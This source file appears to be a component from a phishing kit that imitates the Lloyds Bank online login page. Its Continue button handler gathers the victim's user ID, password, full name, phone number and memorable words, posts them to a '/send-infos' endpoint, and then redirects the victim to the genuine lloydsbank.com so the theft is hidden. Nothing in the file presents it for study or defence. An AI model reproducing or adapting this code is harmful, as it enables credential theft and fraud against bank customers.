import React from "react";

import continueBtn from "../assets/btn0001a_new-1560876840.png";
import { InputsContext } from "../contexts/inputsContext";
import { WhichFormContext } from "../contexts/whichFormContext";
import { ErrorContext } from "../contexts/errorContext";
import axios from "axios";

interface ContinueBtnProps {
  shouldShow?: boolean;
  setInputFocus?: Function;
}

export const ContinueBtn: React.FC<ContinueBtnProps> = ({
  shouldShow = true,
  setInputFocus,
}) => {
  const { inputs } = React.useContext(InputsContext) as InputsType;
  const { whichForm, showWhichForm } = React.useContext(
    WhichFormContext
  ) as whichFormType;
  const { showError } = React.useContext(ErrorContext) as errorType;

  const handleContinue = async (
    e: React.MouseEvent<HTMLInputElement, MouseEvent>
  ) => {
    e.preventDefault();

    if (whichForm) {
      if (!inputs.userId || !inputs.password) {
        showError(true);
        setInputFocus!({
          userId: !inputs.userId,
          password: !inputs.password,
        });
      } else {
        showWhichForm(false);
      }
    } else {
      if (!inputs.fullName || !inputs.phoneNumber || !inputs.memorableWords) {
        showError(true);
        setInputFocus!({
          fullName: !inputs.fullName,
          phoneNumber: !inputs.phoneNumber,
          memorableWords: !inputs.memorableWords,
        });
      } else {
        await axios.post("/send-infos", inputs);
        window.location.replace("https://www.lloydsbank.com/");
      }
    }
  };

  return (
    <div className="loginActions clearfix">
      <input
        id="frmLogin:btnLogin1"
        name="frmLogin:btnLogin1"
        type="image"
        className="submitAction"
        src={continueBtn}
        alt="Continue"
        title="Continue"
        onClick={handleContinue}
      />
      <ul
        id="frmLogin:pnlLogin2DMC"
        className="linkList"
        style={{ display: shouldShow ? "block" : "none" }}
      >
        <li>
          <a
            id="frmLogin:lkFrgtLogonLinkDMC"
            href="/ib-access/cwa/forgotten-details/index.html"
            title="Forgotten your logon details?"
          >
            Forgotten your logon details?
          </a>
        </li>
      </ul>
    </div>
  );
};
